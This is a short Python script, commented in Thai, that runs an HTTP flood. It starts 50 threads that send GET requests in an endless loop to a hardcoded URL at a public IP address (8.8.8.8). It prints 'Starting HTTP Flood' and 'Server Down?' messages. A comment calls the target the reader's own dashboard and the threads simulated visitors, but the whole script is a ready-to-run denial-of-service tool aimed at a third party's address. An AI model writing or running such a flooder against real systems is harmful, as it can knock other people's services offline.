import threading
import requests

TARGET_URL = "http://8.8.8.8:80/" # หน้าเว็บ Dashboard ของคุณ

def attack():
    while True:
        try:
            response = requests.get(TARGET_URL)
            print(f"🔥 Request sent! Status: {response.status_code}", end='\r')
        except:
            print("❌ Server Down?", end='\r')

# สร้าง Thread จำลองคน 50 คนเข้าเว็บพร้อมกัน
print(f"🚀 Starting HTTP Flood on {TARGET_URL}")
for i in range(50):
    thread = threading.Thread(target=attack)
    thread.daemon = True
    thread.start()

# รันค้างไว้
while True:
    pass